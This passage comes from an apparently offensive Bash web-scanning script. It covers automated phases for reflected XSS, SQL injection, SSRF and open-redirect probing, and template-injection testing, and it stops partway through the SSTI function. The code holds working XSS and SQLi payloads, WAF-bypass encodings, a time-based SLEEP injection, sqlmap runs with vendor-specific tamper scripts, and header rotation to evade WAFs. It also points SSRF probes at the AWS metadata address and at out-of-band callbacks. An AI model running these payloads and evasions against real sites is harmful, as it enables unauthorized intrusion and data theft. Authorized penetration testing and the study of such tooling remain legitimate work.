#       This phase focuses on reflection verification + dalfox active scanning.
#       No nuclei re-run here â€” eliminates duplicate scanning.
phase_xss() {
    log_phase "Phase 8: XSS Detection"

    if [[ ! -s "$ALL_URLS" ]]; then
        log_warn "No URLs collected for XSS testing."
        return
    fi

    # â”€â”€ Build candidate list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local param_urls="$VULN_DIR/xss/param_urls.txt"
    grep "=" "$ALL_URLS" 2>/dev/null | sort -u > "$param_urls"
    local param_count; param_count=$(wc -l < "$param_urls" 2>/dev/null || echo 0)
    log_info "URLs with parameters: ${param_count}"

    local xss_candidates="$VULN_DIR/xss/xss_candidates.txt"
    if require_tool gf; then
        cat "$param_urls" | gf xss 2>/dev/null | sort -u > "$xss_candidates" || \
            cp "$param_urls" "$xss_candidates"
    else
        grep -iE "[?&](q|search|query|s|keyword|term|text|input|data|content|message|comment|name|value|param|field)=" \
            "$param_urls" 2>/dev/null | sort -u > "$xss_candidates" || \
            cp "$param_urls" "$xss_candidates"
    fi

    # Exclude OAuth/SSO endpoints â€” they reflect params by design (major FP source).
    # Also exclude WAF/CDN challenge endpoints â€” _Incapsula_Resource, cdn-cgi etc.
    # reflect every parameter and produce 100% false positives.
    grep -viE "(oauth|openid|keycloak|login-actions|session_code|code_challenge|redirect_uri|response_type|client_id|nonce|scope=openid|saml|_Incapsula_Resource|SWJIYLWA=|/cdn-cgi/)" \
        "$xss_candidates" 2>/dev/null | sort -u > "${xss_candidates}.clean"
    mv "${xss_candidates}.clean" "$xss_candidates"

    local cand_count; cand_count=$(wc -l < "$xss_candidates" 2>/dev/null || echo 0)
    log_info "XSS candidates (post-filter): ${cand_count}"
    [[ "$cand_count" -eq 0 ]] && { log_info "No XSS candidates after filtering."; return; }

    # â”€â”€ Select payloads (WAF-aware) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Primary probe: unique marker allows us to verify unencoded reflection
    local MARKER="bbXSSprb$(date +%N | head -c 6)"
    local plain_probe="${MARKER}\">${MARKER}<svg onload=confirm(${MARKER})>"

    # WAF-bypass payload variants
    local waf_payloads=()
    if $WAF_DETECTED; then
        log_info "WAF (${WAF_NAME}) detected â€” using encoded XSS payloads"
        waf_payloads=(
            "$(urlencode "${MARKER}\"><svg/onload=alert(1)>")"
            "$(double_urlencode "${MARKER}\"><img src=x onerror=alert(1)>")"
            "${MARKER}\"autofocus/onfocus=alert(1)//"
            "${MARKER}\"><sVg/onload=confirm\`1\`>"
            "${MARKER}\"><input autofocus onfocus=alert(1)>"
            "${MARKER}\"><details open ontoggle=alert(1)>"
        )
    fi

    # â”€â”€ Reflection check with FP verification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    log_info "Phase 1: Reflection probe (FP-verified)..."
    local reflected_out="$VULN_DIR/xss/reflected.txt"
    > "$reflected_out"

    # Evasion opts for XSS probes â€” WAF_EVASION_CURL_OPTS already includes rotated UA,
    # so drop the hardcoded User-Agent below when WAF is active.
    local _xss_evasion_opts=()
    $WAF_DETECTED && _xss_evasion_opts=("${WAF_EVASION_CURL_OPTS[@]+"${WAF_EVASION_CURL_OPTS[@]}"}")

    local tested=0
    while IFS= read -r url; do
        [[ $tested -ge 300 ]] && break
        ((tested++))

        # Inject MARKER into every param value to detect reflection scope
        local probe_url; probe_url=$(python3 -c "
import sys, urllib.parse, re
url = sys.argv[1]; marker = sys.argv[2]
def replace_val(m): return m.group(1) + urllib.parse.quote(marker)
print(re.sub(r'(=)[^&]*', replace_val, url))
" "$url" "${MARKER}" 2>/dev/null || echo "$url")

        # Use evasion headers when WAF active, plain UA otherwise
        local _xss_ua_opt=()
        $WAF_DETECTED || _xss_ua_opt=(-H "User-Agent: Mozilla/5.0")
        local resp; resp=$(curl -s --connect-timeout 8 --max-time 12 \
            "${_xss_ua_opt[@]+"${_xss_ua_opt[@]}"}" \
            ${_xss_evasion_opts[@]+"${_xss_evasion_opts[@]}"} \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$probe_url" 2>/dev/null)

        # FP check 1: only proceed if MARKER literally reflects (unencoded)
        echo "$resp" | grep -qF "$MARKER" || { waf_sleep; continue; }

        # FP check 2: content-type must be text/html
        local ct; ct=$(curl -s -I --connect-timeout 5 \
            "${_xss_ua_opt[@]+"${_xss_ua_opt[@]}"}" \
            ${_xss_evasion_opts[@]+"${_xss_evasion_opts[@]}"} \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$probe_url" 2>/dev/null | grep -i "content-type" | head -1)
        echo "$ct" | grep -qi "text/html" || { waf_sleep; continue; }

        # FP check 3: confirm reflection is inside HTML context, not inside JSON/script string
        # If MARKER appears only inside quotes in a script tag, skip
        local marker_context; marker_context=$(echo "$resp" | grep -oE ".{0,10}${MARKER}.{0,10}" | head -3)
        echo "$marker_context" | grep -qE "^[^<>]*\"${MARKER}" && \
            echo "$marker_context" | grep -qvE "<[^>]*${MARKER}|>${MARKER}" && \
            { waf_sleep; continue; }  # only in attribute value, not in HTML tag context

        # â”€â”€ Now test with actual XSS payload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local xss_url; xss_url=$(python3 -c "
import sys, urllib.parse, re
url = sys.argv[1]; payload = sys.argv[2]
def replace_val(m): return m.group(1) + urllib.parse.quote(payload)
print(re.sub(r'(=)[^&]*', replace_val, url))
" "$url" "${plain_probe}" 2>/dev/null || echo "$url")

        local xss_resp; xss_resp=$(curl -s --connect-timeout 8 --max-time 12 \
            "${_xss_ua_opt[@]+"${_xss_ua_opt[@]}"}" \
            ${_xss_evasion_opts[@]+"${_xss_evasion_opts[@]}"} \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$xss_url" 2>/dev/null)

        if echo "$xss_resp" | grep -qE "<svg[^>]*onload|<img[^>]*onerror|confirm\(${MARKER}\)"; then
            # FP check 4: verify with second independent request
            local verify_resp; verify_resp=$(curl -s --connect-timeout 8 --max-time 12 \
                "${_xss_ua_opt[@]+"${_xss_ua_opt[@]}"}" \
                ${_xss_evasion_opts[@]+"${_xss_evasion_opts[@]}"} \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$xss_url" 2>/dev/null)
            if echo "$verify_resp" | grep -qE "<svg[^>]*onload|confirm\(${MARKER}\)"; then
                echo "[CONFIRMED] $url" >> "$reflected_out"
                log_finding "Confirmed reflected XSS: $url"
            else
                echo "[UNVERIFIED] $url" >> "$reflected_out"
            fi
        fi

        # WAF bypass variants (only when WAF detected)
        if $WAF_DETECTED; then
            for waf_p in "${waf_payloads[@]}"; do
                waf_sleep
                local wu; wu=$(echo "$url" | sed "s/=\([^&]*\)/=${waf_p}/g")
                local wr; wr=$(curl -s --connect-timeout 8 --max-time 12 \
                    ${_xss_evasion_opts[@]+"${_xss_evasion_opts[@]}"} \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$wu" 2>/dev/null)
                if echo "$wr" | grep -qiE "svg.*onload|img.*onerror|onfocus.*alert|ontoggle.*alert"; then
                    echo "[WAF-BYPASS] $url (payload: ${waf_p:0:40})" >> "$reflected_out"
                    log_finding "XSS WAF bypass: $url"
                fi
            done
        fi

        waf_sleep
    done < "$xss_candidates"

    local reflected_count; reflected_count=$(grep -c "CONFIRMED" "$reflected_out" 2>/dev/null || echo 0)
    local unverified_count; unverified_count=$(grep -c "UNVERIFIED" "$reflected_out" 2>/dev/null || echo 0)
    [[ "$reflected_count" -gt 0 ]] && log_finding "Confirmed XSS reflections: ${BOLD}${reflected_count}${RESET} (unverified: ${unverified_count})"

    # â”€â”€ Dalfox active scanner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if require_tool dalfox && [[ -s "$xss_candidates" ]]; then
        log_info "Phase 2: Dalfox deep XSS scan (top 100 candidates)..."
        local dalfox_opts=(
            --waf-bypass
            --silence
            --timeout 10
            --delay "${WAF_DELAY:-0}"
        )
        $WAF_DETECTED && dalfox_opts+=(--skip-mining-dom)  # skip DOM mining â€” too noisy behind WAF

        cat "$xss_candidates" | head -100 | \
            dalfox pipe \
                "${dalfox_opts[@]}" \
                ${AUTH_DALFOX_OPTS[@]+"${AUTH_DALFOX_OPTS[@]}"} \
                --output "$VULN_DIR/xss/dalfox_findings.txt" \
                2>/dev/null || true

        local dalf_count; dalf_count=$(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
        [[ "$dalf_count" -gt 0 ]] && log_finding "Dalfox XSS findings: ${BOLD}${dalf_count}${RESET}"
    fi

    # â”€â”€ Combine all XSS findings â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Nuclei XSS results already in: $VULN_DIR/nuclei/injections.jsonl (xss tag)
    # Count confirmed findings across all sources
    local nuclei_xss_count; nuclei_xss_count=$(
        python3 -c "
import json
count=0
for line in open('$VULN_DIR/nuclei/injections.jsonl'):
    try:
        d=json.loads(line)
        if 'xss' in str(d.get('info',{}).get('tags','')).lower(): count+=1
    except: pass
print(count)" 2>/dev/null || echo 0)
    log_ok "XSS summary â€” reflection: ${reflected_count} confirmed, dalfox: $(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0), nuclei: ${nuclei_xss_count}"
}

# â”€â”€â”€ Phase 9: SQLi Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# NOTE: Nuclei SQLi templates already ran in phase_vulns (injections.jsonl, tag: sqli).
#       This phase adds: error-based confirmation with baseline FP-filtering,
#       WAF-aware payload encoding, and sqlmap (when WAF-tolerant rate used).
phase_sqli() {
    log_phase "Phase 9: SQL Injection Testing"

    [[ ! -s "$ALL_URLS" ]] && { log_warn "No URLs for SQLi testing."; return; }

    local sqli_candidates="$VULN_DIR/sqli/sqli_candidates.txt"

    if require_tool gf; then
        cat "$ALL_URLS" | gf sqli 2>/dev/null | sort -u > "$sqli_candidates" || true
    else
        grep -iE "[?&](id|page|cat|product|item|order|sort|num|year|view|article|news|user|query|search|filter|q)=" \
            "$ALL_URLS" 2>/dev/null | sort -u > "$sqli_candidates"
    fi

    # Strip OAuth/SSO/CDN noise â€” not SQLi targets, major FP source
    grep -viE "(oauth|openid|keycloak|login-actions|session_code|code_challenge|redirect_uri|response_type|client_id|nonce|scope=openid|tab_id=|utm_|fbclid|gclid)" \
        "$sqli_candidates" 2>/dev/null | sort -u > "${sqli_candidates}.filtered"
    mv "${sqli_candidates}.filtered" "$sqli_candidates"

    local cand_count; cand_count=$(wc -l < "$sqli_candidates" 2>/dev/null || echo 0)
    log_info "SQLi candidates (post-filter): ${cand_count}"
    [[ "$cand_count" -eq 0 ]] && { log_info "No SQLi candidates after filtering."; return; }

    # â”€â”€ WAF-aware payload set â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Payloads are appended to existing param value (not replacing) to preserve URL structure
    local error_payloads=("'" "'''" ";--" "\\")
    if $WAF_DETECTED; then
        log_info "WAF (${WAF_NAME}) detected â€” using obfuscated SQLi probe payloads"
        # Layered evasion: URL encoding, comment injection, case variation,
        # tab-for-space, MySQL inline comments, hex encoding, MSSQL syntax.
        # Plain variants intentionally excluded â€” WAF would block them first.
        local waf_error_payloads=(
            "%27"                               # Single URL-encoded quote
            "%2527"                             # Double URL-encoded quote
            "'+--+-"                            # Comment terminator (URL-encoded space)
            "'/**/OR/**/1=1--"                  # Spaces replaced with /**/ comments
            "'/*!OR*/1=1--"                     # MySQL version-conditional inline comment
            "'%09OR%091=1--"                    # Tab (0x09) instead of space
            "'+oR+'1'='1"                       # Mixed-case keyword
            "0x27"                              # Hex-encoded quote (MySQL)
            "%27%20OR%20%271%27%3D%271"         # Fully URL-encoded OR bypass
            "';--+-"                            # Semicolon + comment (MSSQL style)
            "'%20AND%20'1'='1"                  # URL-encoded AND boolean probe
            "'/**/AND/**/'1'='1"                # Comment-padded AND
        )
        error_payloads+=("${waf_error_payloads[@]}")
    fi

    # SQLi error signatures (strict patterns â€” reduces FP from generic error pages)
    local sqli_error_pattern
    sqli_error_pattern="(you have an error in your sql syntax|warning.*mysql_|warning.*mysqli_|unclosed quotation mark|quoted string not properly terminated|ORA-[0-9]{5}|microsoft ole db provider.*sql|pg::sintaxerror|invalid query|division by zero.*sql|supplied argument is not a valid mysql|error in your sql|syntax error.*unexpected)"

    # â”€â”€ Error-based check with baseline FP filtering â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    log_info "Error-based SQLi probe with baseline comparison (top 100)..."
    # When WAF is present inject evasion headers into every probe request
    local _sqli_evasion_opts=()
    $WAF_DETECTED && _sqli_evasion_opts=("${WAF_EVASION_CURL_OPTS[@]+"${WAF_EVASION_CURL_OPTS[@]}"}")

    local err_count=0
    local confirmed_count=0
    while IFS= read -r url; do
        # Baseline â€” clean URL, no payload
        local baseline_body; baseline_body=$(curl -s --connect-timeout 8 --max-time 12 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            ${_sqli_evasion_opts[@]+"${_sqli_evasion_opts[@]}"} \
            "$url" 2>/dev/null)
        local baseline_len="${#baseline_body}"

        # FP pre-check: if baseline already contains SQL error strings, skip this URL
        if echo "$baseline_body" | grep -qiE "$sqli_error_pattern"; then
            log_dim "  Skipping (baseline already shows SQL-like error): $url"
            waf_sleep; continue
        fi

        local found_error=false
        for payload in "${error_payloads[@]}"; do
            waf_sleep
            # Append payload to each param value
            local test_url; test_url=$(python3 -c "
import sys, re
url, payload = sys.argv[1], sys.argv[2]
print(re.sub(r'(=[^&]*)', lambda m: m.group(1) + payload, url))
" "$url" "$payload" 2>/dev/null || echo "${url}${payload}")

            local resp; resp=$(curl -s --connect-timeout 8 --max-time 12 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                ${_sqli_evasion_opts[@]+"${_sqli_evasion_opts[@]}"} \
                "$test_url" 2>/dev/null)

            if echo "$resp" | grep -qiE "$sqli_error_pattern"; then
                # FP check: ensure the error isn't just the same generic page as baseline
                local resp_len="${#resp}"
                local len_diff=$(( resp_len > baseline_len ? resp_len - baseline_len : baseline_len - resp_len ))

                # Require either: significant length change OR new error pattern not in baseline
                if [[ "$len_diff" -gt 50 ]] || \
                   ! echo "$baseline_body" | grep -qiE "$sqli_error_pattern"; then
                    if ! $found_error; then
                        echo "$url | payload: $payload" >> "$VULN_DIR/sqli/error_based.txt"
                        log_finding "SQL error triggered: $url (payload: ${payload})"
                        found_error=true
                        ((err_count++))

                        # Confirmation: try a second, structurally different payload to reduce FP.
                        # WAF variants use comment obfuscation rather than plain encoding alone.
                        local confirm_payload="' AND '1'='2"
                        if $WAF_DETECTED; then
                            confirm_payload="'/**/AND/**/'1'='2"
                        fi
                        local confirm_url; confirm_url=$(python3 -c "
import sys, re
url, payload = sys.argv[1], sys.argv[2]
print(re.sub(r'(=[^&]*)', lambda m: m.group(1) + payload, url))
" "$url" "$confirm_payload" 2>/dev/null)
                        local confirm_resp; confirm_resp=$(curl -s --connect-timeout 8 \
                            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                            ${_sqli_evasion_opts[@]+"${_sqli_evasion_opts[@]}"} \
                            "$confirm_url" 2>/dev/null)
                        if echo "$confirm_resp" | grep -qiE "$sqli_error_pattern" || \
                           [[ "${#confirm_resp}" -ne "$baseline_len" ]]; then
                            echo "$url | CONFIRMED" >> "$VULN_DIR/sqli/error_based_confirmed.txt"
                            log_finding "CONFIRMED SQLi: $url"
                            ((confirmed_count++))
                        fi
                    fi
                fi
                break  # Don't try more payloads once we have a finding for this URL
            fi
        done
    done < <(head -100 "$sqli_candidates")

    [[ $err_count -gt 0 ]] && log_finding "Error-based SQLi: ${err_count} triggered, ${confirmed_count} confirmed"

    # â”€â”€ Time-based blind SQLi (limited, only for confirmed error targets) â”€â”€â”€â”€â”€
    if [[ "$confirmed_count" -gt 0 ]] && [[ -s "$VULN_DIR/sqli/error_based_confirmed.txt" ]]; then
        log_info "Time-based blind verification on ${confirmed_count} confirmed targets..."
        while IFS='|' read -r url _rest; do
            url="${url// /}"
            # WAF variant uses comment obfuscation + URL encoding â€” avoids plain SLEEP keyword
            local sleep_payload="' AND SLEEP(5)--"
            $WAF_DETECTED && sleep_payload="'/**/AND/**/SLEEP(5)--"
            local turl; turl=$(python3 -c "
import sys, re
url, payload = sys.argv[1], sys.argv[2]
print(re.sub(r'(=[^&]*)', lambda m: m.group(1) + payload, url))
" "$url" "$sleep_payload" 2>/dev/null)
            local t0=$SECONDS
            curl -s --connect-timeout 10 --max-time 15 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                ${_sqli_evasion_opts[@]+"${_sqli_evasion_opts[@]}"} \
                "$turl" >/dev/null 2>&1 || true
            local elapsed=$(( SECONDS - t0 ))
            if [[ $elapsed -ge 4 ]]; then
                echo "$url | time-based confirmed (${elapsed}s)" >> "$VULN_DIR/sqli/timebased_confirmed.txt"
                log_finding "Time-based SQLi confirmed (${elapsed}s delay): $url"
            fi
        done < "$VULN_DIR/sqli/error_based_confirmed.txt"
    fi

    # â”€â”€ sqlmap (WAF-aware settings) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if require_tool sqlmap; then
        local sqlmap_threads=10 sqlmap_level=2 sqlmap_risk=1
        local sqlmap_extra_opts=()
        if $WAF_DETECTED; then
            sqlmap_threads=3
            sqlmap_level=1
            sqlmap_risk=1
            # Use tamper scripts to bypass common WAFs
            case "${WAF_NAME,,}" in
                cloudflare)   sqlmap_extra_opts+=(--tamper=between,charencode,randomcase) ;;
                modsecurity)  sqlmap_extra_opts+=(--tamper=space2comment,charencode) ;;
                akamai)       sqlmap_extra_opts+=(--tamper=between,charencode) ;;
                *)            sqlmap_extra_opts+=(--tamper=charencode,randomcase) ;;
            esac
            log_warn "  WAF mode: sqlmap threads=${sqlmap_threads}, tamper=${sqlmap_extra_opts[*]}"
        fi

        log_info "Running sqlmap (first 50 candidates, level=${sqlmap_level}, risk=${sqlmap_risk}, max 15m)..."
        head -50 "$sqli_candidates" > "$VULN_DIR/sqli/targets_limited.txt"
        local _sqlmap_cmd="sqlmap -m \"$VULN_DIR/sqli/targets_limited.txt\" --batch --random-agent --level=${sqlmap_level} --risk=${sqlmap_risk} --threads=${sqlmap_threads}"
        timeout 900 sqlmap \
            -m "$VULN_DIR/sqli/targets_limited.txt" \
            --batch \
            --random-agent \
            --level="$sqlmap_level" \
            --risk="$sqlmap_risk" \
            --threads="$sqlmap_threads" \
            "${sqlmap_extra_opts[@]}" \
            ${AUTH_SQLMAP_OPTS[@]+"${AUTH_SQLMAP_OPTS[@]}"} \
            --output-dir="$VULN_DIR/sqli/sqlmap_results" \
            2>/dev/null || \
            { [[ $? -eq 124 ]] && defer_cmd "sqlmap (timed out at 15m)" "$_sqlmap_cmd --resume"; true; }
        log_ok "sqlmap results: $VULN_DIR/sqli/sqlmap_results/"
    fi
}

# â”€â”€â”€ Phase 10: SSRF & Open Redirect â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# NOTE: Nuclei SSRF & redirect templates already ran in phase_vulns (injections.jsonl).
#       This phase focuses on active verification with unique callback markers.
phase_ssrf_redirect() {
    log_phase "Phase 10: SSRF & Open Redirect"

    [[ ! -s "$ALL_URLS" ]] && return

    # â”€â”€ Open Redirect â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    log_info "Checking open redirect candidates..."
    local redirect_candidates="$VULN_DIR/ssrf/redirect_candidates.txt"

    if require_tool gf; then
        cat "$ALL_URLS" | gf redirect 2>/dev/null | sort -u > "$redirect_candidates" || true
    else
        grep -iE "[?&](redirect|url|next|return|returnurl|redir|dest|destination|goto|target|link|out|forward|continue|back)=" \
            "$ALL_URLS" 2>/dev/null | sort -u > "$redirect_candidates"
    fi

    # Exclude same-domain redirects (they are by design, not vulnerabilities)
    grep -viE "(${TARGET}|localhost|127\.0\.0\.1)" "$redirect_candidates" 2>/dev/null \
        | sort -u > "${redirect_candidates}.ext"
    [[ -s "${redirect_candidates}.ext" ]] && mv "${redirect_candidates}.ext" "$redirect_candidates"

    if [[ -s "$redirect_candidates" ]] && require_tool httpx; then
        log_info "Testing $(wc -l < "$redirect_candidates") redirect candidates..."
        # Use a unique marker domain to avoid FP from generic external-link checks
        local redir_marker="webpwn-redir-$(date +%N | head -c 6).invalid"
        cat "$redirect_candidates" | head -200 | \
            (has_tool qsreplace && qsreplace "https://${redir_marker}" || \
             sed "s|=[^&]*|=https://${redir_marker}|g") | \
            httpx -silent -follow-redirects -location \
                ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} 2>/dev/null | \
            grep -i "$redir_marker" | \
            tee "$VULN_DIR/ssrf/open_redirects.txt" || true
        local redir_count; redir_count=$(wc -l < "$VULN_DIR/ssrf/open_redirects.txt" 2>/dev/null || echo 0)
        [[ "$redir_count" -gt 0 ]] && log_finding "Open redirects: ${BOLD}${redir_count}${RESET}"
    fi

    # â”€â”€ SSRF candidate identification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    log_info "Checking SSRF candidates..."
    local ssrf_candidates="$VULN_DIR/ssrf/ssrf_candidates.txt"
    grep -iE "[?&](url|uri|src|dest|source|target|redirect|proxy|fetch|load|resource|link|image|img|file|path|host|server|domain|callback|webhook|endpoint|api_url|base_url)=" \
        "$ALL_URLS" 2>/dev/null | \
        grep -viE "(${TARGET}|\.css\?|\.js\?|\.png\?|\.jpg\?)" | \
        sort -u > "$ssrf_candidates"

    local ssrf_count; ssrf_count=$(wc -l < "$ssrf_candidates" 2>/dev/null || echo 0)
    if [[ "$ssrf_count" -gt 0 ]]; then
        log_info "SSRF candidates: ${ssrf_count}"

        # Active SSRF probe with interactsh if available
        if has_tool interactsh-client; then
            log_info "Probing SSRF candidates with interactsh (OOB callback)..."
            local issh_out; issh_out=$(mktemp /tmp/webpwn_issh_XXXXXX)
            # Start interactsh listener in background
            timeout 60 interactsh-client -server "${INTERACTSH_SERVER}" \
                -json -o "$issh_out" &>/dev/null &
            local issh_pid=$!

            # Inject interactsh URL into SSRF-prone params
            local issh_url; issh_url=$(interactsh-client -server "${INTERACTSH_SERVER}" -n 1 2>/dev/null | head -1)
            if [[ -n "$issh_url" ]]; then
                head -50 "$ssrf_candidates" | while IFS= read -r u; do
                    waf_sleep
                    local tu; tu=$(echo "$u" | sed "s|=[^&]*|=http://${issh_url}|g")
                    curl -s --connect-timeout 5 --max-time 10 \
                        ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$tu" >/dev/null 2>&1 || true
                done
                sleep 10  # Wait for OOB callbacks
            fi
            kill "$issh_pid" 2>/dev/null || true
            [[ -s "$issh_out" ]] && {
                cp "$issh_out" "$VULN_DIR/ssrf/interactsh_hits.json"
                log_finding "Interactsh SSRF hits: $(wc -l < "$issh_out") â†’ $VULN_DIR/ssrf/interactsh_hits.json"
            }
            rm -f "$issh_out"
        else
            log_info "  interactsh-client not found â€” skipping OOB SSRF probe"
            log_info "  Payload: http://169.254.169.254/latest/meta-data/ (AWS metadata)"
            log_info "  Manual testing recommended with Burp Collaborator"
        fi

        # Nuclei SSRF results already in injections.jsonl (ssrf tag) â€” no re-run needed
        local nuclei_ssrf_count; nuclei_ssrf_count=$(python3 -c "
import json
count=0
for line in open('$VULN_DIR/nuclei/injections.jsonl'):
    try:
        d=json.loads(line)
        if 'ssrf' in str(d.get('info',{}).get('tags','')).lower(): count+=1
    except: pass
print(count)" 2>/dev/null || echo 0)
        [[ "$nuclei_ssrf_count" -gt 0 ]] && log_ok "  Nuclei SSRF findings (from phase_vulns): ${nuclei_ssrf_count}"
    fi
}

# â”€â”€â”€ Phase 10b: SSTI Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# NOTE: Nuclei ssti templates run via phase_vulns (injections.jsonl).
#       This phase performs active probe-based detection to confirm rendering.
phase_ssti() {
    log_phase "Phase 10b: SSTI (Server-Side Template Injection)"

    [[ ! -s "$ALL_URLS" ]] && { log_warn "No URLs for SSTI testing."; return; }

    mkdir -p "$VULN_DIR/ssti"
    local ssti_out="$VULN_DIR/ssti/findings.txt"
    > "$ssti_out"

    # Build candidate list: URLs with parameters, excluding WAF/CDN challenge
    # endpoints (_Incapsula_Resource, cdn-cgi) which reflect every param and
    # produce 100% false positives for template-injection probes.
    local ssti_candidates="$VULN_DIR/ssti/candidates.txt"
    grep "=" "$ALL_URLS" 2>/dev/null | \
        grep -viE "\.(css|js|png|jpg|gif|svg|ico|woff|ttf|eot)(\?|$)" | \
        grep -viE "_Incapsula_Resource|SWJIYLWA=|/cdn-cgi/" | \
        sort -u > "$ssti_candidates"

    local cand_count; cand_count=$(wc -l < "$ssti_candidates" 2>/dev/null || echo 0)
    log_info "SSTI candidates: ${cand_count} URLs with parameters"
    [[ "$cand_count" -eq 0 ]] && return

    # Polyglot probe: triggers evaluation in Jinja2, Twig, Freemarker, Smarty, Pebble
    # Uses a math expression that resolves to a unique string only if evaluated
    local MARKER; MARKER="ssti$(date +%N | head -c 6)"
    # ${{7*7}} â†’ 49 in most engines; {{7*7}} â†’ 49 in Jinja2/Twig; #{7*7} â†’ 49 in SPEL
    local probes=(
        '{{7*7}}'
        '${{7*7}}'
        '#{7*7}'
        '${7*7}'
        '<%= 7*7 %>'
        '{7*7}'
        '{{7*"7"}}'    # Twig: 7777777
    )

    local tested=0 findings=0

    while IFS= read -r url; do
        [[ $tested -ge 200 ]] && break
        ((tested++))
        waf_sleep

        # Baseline response length (no injection)
        local baseline_len; baseline_len=$(curl -s --connect-timeout 8 --max-time 12 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$url" 2>/dev/null | wc -c)

        for probe in "${probes[@]}"; do
            local probe_url; probe_url=$(python3 -c "
import sys, urllib.parse, re
url = sys.argv[1]; probe = sys.argv[2]
def replace_val(m): return m.group(1) + urllib.parse.quote(probe)
print(re.sub(r'(=)[^&]*', replace_val, url, count=1))
" "$url" "$probe" 2>/dev/null || echo "")
            [[ -z "$probe_url" || "$probe_url" == "$url" ]] && continue

            waf_sleep
            local resp; resp=$(curl -s --connect-timeout 8 --max-time 12 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$probe_url" 2>/dev/null)

            # Detection: look for evaluated math result (49) or Twig (7777777)
            if echo "$resp" | grep -qE '\b49\b|7777777'; then
                # Verify: baseline shouldn't contain 49 as a standalone number
                local baseline_resp; baseline_resp=$(curl -s --connect-timeout 8 --max-time 12 \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$url" 2>/dev/null)
                if ! echo "$baseline_resp" | grep -qE '\b49\b'; then
                    echo "[SSTI][probe=${probe}] $url" >> "$ssti_out"
